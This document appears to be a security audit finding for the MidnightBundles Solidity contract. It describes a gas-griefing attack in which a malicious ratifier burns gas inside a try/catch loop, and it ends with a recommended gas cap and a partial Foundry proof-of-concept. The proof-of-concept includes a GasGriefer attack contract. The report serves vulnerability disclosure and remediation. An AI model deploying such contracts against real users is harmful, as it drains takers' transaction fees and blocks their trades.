### Title
Unbounded Gas Griefing via Malicious Ratifier in try/catch Loop - (File: src/periphery/MidnightBundles.sol)

### Summary
The `buyWithUnitsTargetAndWithdrawCollateral` (and all three sibling bundle functions) iterate over a caller-supplied `takes[]` array and wrap each `IMidnight.take()` call in a bare `try {} catch {}`. Because `Midnight.take()` calls `IRatifier(offer.ratifier).isRatified()` with no gas cap before any state change that would prevent re-entry, an attacker who is the maker of N offers can set `offer.ratifier` to a contract that burns near-maximum gas then reverts, causing the bundler to silently absorb O(N × ratifier_gas) before reaching `OutOfOffers`.

### Finding Description

**Exact code path:**

`MidnightBundles.sol` lines 71–86:
```solidity
for (uint256 i; i < takes.length && filledUnits < targetUnits; i++) {
    ...
    try IMidnight(MIDNIGHT)
        .take(takes[i].offer, takes[i].ratifierData, unitsToTake, taker, address(0), address(0), "") returns (...)
    {
        filledUnits += unitsToTake;
        filledBuyerAssets += resBuyerAssets;
    } catch {}          // ← silent, no gas accounting
}
```

Inside `Midnight.take()` (Midnight.sol line 355–356):
```solidity
require(isAuthorized[offer.maker][offer.ratifier], RatifierUnauthorized());
require(IRatifier(offer.ratifier).isRatified(offer, ratifierData) == CALLBACK_SUCCESS, RatifierFail());
```

The ratifier call is the **first external call** in `take()` and is made with no explicit gas limit, so it receives up to 63/64 of the gas forwarded by the bundler's `try` call.

**Attacker-controlled inputs:**
- `offer.ratifier` — set by the maker (attacker) in the signed offer struct.
- `offer.maker` — the attacker's own address; they call `setIsAuthorized(maliciousRatifier, true, attackerAddress)` on Midnight to satisfy the `RatifierUnauthorized` guard.
- `takes[]` — the array passed to the bundle function; in practice populated by off-chain aggregators that scan the order book.

**Exploit flow:**
1. Attacker deploys `GasGriefer` implementing `IRatifier.isRatified()` that executes a tight loop burning ~100 k gas then reverts (or returns a non-`CALLBACK_SUCCESS` value).
2. Attacker calls `Midnight.setIsAuthorized(GasGriefer, true, attacker)`.
3. Attacker signs N sell offers with `offer.ratifier = GasGriefer`, competitive prices, and valid deadlines, and publishes them to the off-chain order book.
4. A legitimate taker (or an aggregator acting on their behalf) constructs `takes[]` containing these N offers and calls `buyWithUnitsTargetAndWithdrawCollateral`.
5. Each loop iteration: bundler forwards ~63/64 of remaining gas → `Midnight.take()` forwards ~63/64 again → `GasGriefer.isRatified()` burns ~100 k gas → reverts → `RatifierFail` propagates up → bundler's `catch {}` swallows it → next iteration.
6. After N iterations the loop exits with `filledUnits < targetUnits` and reverts with `OutOfOffers`, having consumed O(N × 100 k) gas from the taker.

**Why existing checks fail:**
- `require(isAuthorized[offer.maker][offer.ratifier])` — satisfied because the attacker authorized their own malicious ratifier.
- The `try/catch` is intentionally broad (NatSpec: *"Skips every reason why take can revert (including ones that are not asynchrony related)"*) — it catches `RatifierFail` just as it catches any other revert, with no gas accounting.
- There is no per-iteration gas floor check, no cap on `takes.length`, and no gas limit passed to the `try` call.
- The same pattern is present in all four bundle functions: `buyWithUnitsTargetAndWithdrawCollateral` (line 79), `supplyCollateralAndSellWithUnitsTarget` (line 152), `buyWithAssetsTargetAndWithdrawCollateral` (line 215), `supplyCollateralAndSellWithAssetsTarget` (line 292).

### Impact Explanation
A taker who calls any bundle function with N attacker-crafted offers pays O(N × ratifier_gas) in transaction gas. With a ratifier burning 100 k gas and N = 50 offers, the taker's transaction consumes ~5 M extra gas beyond the legitimate work, potentially exceeding the block gas limit and causing the transaction to fail entirely, or costing the taker a large ETH fee for a transaction that produces no fills.

### Likelihood Explanation
The preconditions are fully permissionless: creating offers and authorizing a ratifier require no privilege. Off-chain aggregators routinely include any offer at a competitive price without verifying ratifier behavior. The attack is repeatable across blocks by rotating offer signatures (new expiry, new group) and is cheap for the attacker (only off-chain signing cost; the gas is paid by the victim).

### Recommendation
Pass an explicit gas limit to each `try` call so that a single ratifier cannot consume more than a bounded amount per iteration:

```solidity
try IMidnight(MIDNIGHT).take{gas: MAX_TAKE_GAS}(
    takes[i].offer, takes[i].ratifierData, unitsToTake, taker, address(0), address(0), ""
) returns (...) { ... } catch {}
```

`MAX_TAKE_GAS` should be set to a value sufficient for a legitimate take (e.g., 300 k–500 k gas) but small enough to bound per-iteration griefing. Alternatively, add a `takes.length` cap (e.g., ≤ 32) to bound total loop gas regardless of per-iteration cost.

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.34;

import "forge-std/Test.sol";
import {MidnightBundles, Take} from "src/periphery/MidnightBundles.sol";
import {IRatifier} from "src/interfaces/IRatifier.sol";
import {Offer} from "src/interfaces/IMidnight.sol";

contract GasGriefer is IRatifier {
    bytes4 constant CALLBACK_SUCCESS = 0x...; // protocol constant
    function isRatified(Offer memory, bytes memory) external returns (bytes4) {
        uint256 gas = gasleft();
        // burn ~100k gas
        uint256 x;
        while (gasleft() > gas - 100_000) { unchecked { x++; } }
        revert(); // or return wrong selector
    }
}

contract GasGriefingTest is Test {
    function test_gasGriefingViaRatifier() public {
        // Setup: deploy Midnight + MidnightBundles, create market, mint tokens
        // Attacker: deploy GasGriefer, authorize it on Midnight
        // Build takes[] with N=20 offers all pointing to GasGriefer
        // Measure gas before/after calling buyWithUnitsTargetAndWithdrawCollateral
        uint256 gasBefore = gasleft();
        vm.expectRevert(IMidnightBundles.OutOfOffers.selector);
        bundles.buyWithUnitsTargetAndWithdrawCollateral(
            targetUnits, maxAssets, taker, permit, takes, withdrawals, receiver, 0, address(0)
        );
        uint256 gasUsed = gasBefore - gasleft();
        // Assert: gasUsed > N * 90_000 (near-100k per iteration)
        assertGt(gasUsed, 20 * 90_000);
    }
}
```

Expected assertion: `gasUsed` scales linearly with N, confirming O(N × ratifier_gas) consumption before the `OutOfOffers` revert. [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3) [5](#0-4)

### Citations

**File:** src/periphery/MidnightBundles.sol (L71-86)
```text
        for (uint256 i; i < takes.length && filledUnits < targetUnits; i++) {
            require(!takes[i].offer.buy, InconsistentSide());
            require(IMidnight(MIDNIGHT).toId(takes[i].offer.market) == id, InconsistentMarket());
            uint256 unitsToTake = min(
                targetUnits - filledUnits,
                takes[i].units,
                ConsumableUnitsLib.consumableUnits(MIDNIGHT, id, takes[i].offer)
            );
            try IMidnight(MIDNIGHT)
                .take(takes[i].offer, takes[i].ratifierData, unitsToTake, taker, address(0), address(0), "") returns (
                uint256 resBuyerAssets, uint256
            ) {
                filledUnits += unitsToTake;
                filledBuyerAssets += resBuyerAssets;
            } catch {}
        }
```

**File:** src/periphery/MidnightBundles.sol (L144-161)
```text
        for (uint256 i; i < takes.length && filledUnits < targetUnits; i++) {
            require(takes[i].offer.buy, InconsistentSide());
            require(IMidnight(MIDNIGHT).toId(takes[i].offer.market) == id, InconsistentMarket());
            uint256 unitsToTake = min(
                targetUnits - filledUnits,
                takes[i].units,
                ConsumableUnitsLib.consumableUnits(MIDNIGHT, id, takes[i].offer)
            );
            try IMidnight(MIDNIGHT)
                .take(
                    takes[i].offer, takes[i].ratifierData, unitsToTake, taker, address(this), address(0), ""
                ) returns (
                uint256, uint256 resSellerAssets
            ) {
                filledUnits += unitsToTake;
                filledSellerAssets += resSellerAssets;
            } catch {}
        }
```

**File:** src/periphery/MidnightBundles.sol (L205-222)
```text
        for (uint256 i; i < takes.length && filledBuyerAssets < targetFilledBuyerAssets; i++) {
            require(!takes[i].offer.buy, InconsistentSide());
            require(IMidnight(MIDNIGHT).toId(takes[i].offer.market) == id, InconsistentMarket());
            uint256 unitsToTake = min(
                TakeAmountsLib.buyerAssetsToUnits(
                    MIDNIGHT, id, takes[i].offer, targetFilledBuyerAssets - filledBuyerAssets
                ),
                takes[i].units,
                ConsumableUnitsLib.consumableUnits(MIDNIGHT, id, takes[i].offer)
            );
            try IMidnight(MIDNIGHT)
                .take(takes[i].offer, takes[i].ratifierData, unitsToTake, taker, address(0), address(0), "") returns (
                uint256 resBuyerAssets, uint256
            ) {
                filledUnits += unitsToTake;
                filledBuyerAssets += resBuyerAssets;
            } catch {}
        }
```

**File:** src/periphery/MidnightBundles.sol (L282-301)
```text
        for (uint256 i; i < takes.length && filledSellerAssets < targetFilledSellerAssets; i++) {
            require(takes[i].offer.buy, InconsistentSide());
            require(IMidnight(MIDNIGHT).toId(takes[i].offer.market) == id, InconsistentMarket());
            uint256 unitsToTake = min(
                TakeAmountsLib.sellerAssetsToUnits(
                    MIDNIGHT, id, takes[i].offer, targetFilledSellerAssets - filledSellerAssets
                ),
                takes[i].units,
                ConsumableUnitsLib.consumableUnits(MIDNIGHT, id, takes[i].offer)
            );
            try IMidnight(MIDNIGHT)
                .take(
                    takes[i].offer, takes[i].ratifierData, unitsToTake, taker, address(this), address(0), ""
                ) returns (
                uint256, uint256 resSellerAssets
            ) {
                filledUnits += unitsToTake;
                filledSellerAssets += resSellerAssets;
            } catch {}
        }
```

**File:** src/Midnight.sol (L355-356)
```text
        require(isAuthorized[offer.maker][offer.ratifier], RatifierUnauthorized());
        require(IRatifier(offer.ratifier).isRatified(offer, ratifierData) == CALLBACK_SUCCESS, RatifierFail());
```
